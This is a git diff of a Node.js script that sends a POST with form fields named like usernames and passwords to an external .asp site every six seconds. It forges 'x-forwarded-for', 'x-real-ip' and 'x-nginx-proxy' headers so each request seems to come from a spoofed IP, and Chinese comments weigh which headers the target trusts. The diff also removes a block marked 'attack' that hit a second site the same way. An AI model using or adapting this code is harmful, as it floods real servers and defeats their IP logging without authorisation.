@@ -18,9 +18,15 @@ setInterval(function () {
     axios({
         url: 'http://www.dnf-me.cn/in.asp?action=add',
         method: 'post',
+        /*
+        * 如果你没使用nginx代理服务器但是你用了'x-forwarded-for'获取ip
+        * 如果你使用了nginx代理服务器但是你用了'x-real-ip'或者'x-forwarded-for'获取ip
+        * 假设对方使用'x-nginx-proxy'判断是否使用了nginx
+        * */
         headers: {
-            'x-forwarded-for': ip,
+            'x-nginx-proxy': true,
             'x-real-ip': ip,
+            'x-forwarded-for': ip,
         },
         data: {
             dede_fields: 'u,text;p,text',
@@ -31,18 +37,5 @@ setInterval(function () {
             j_xm: password,
         },
     });
-    // 进攻
-    axios({
-        url: 'http://suibianxiexie.top/phone/',
-        method: 'get',
-        headers: {
-            'X-Real-IP': ip,
-            'x-forwarded-for': ip,
-            'x-nginx-proxy': true,
-        },
-        params: {
-            isOnlyRenderData: true,
-        },
-    }).then((json) => console.log(json.data.ip));
 }, 6000);
 app.listen('6661');
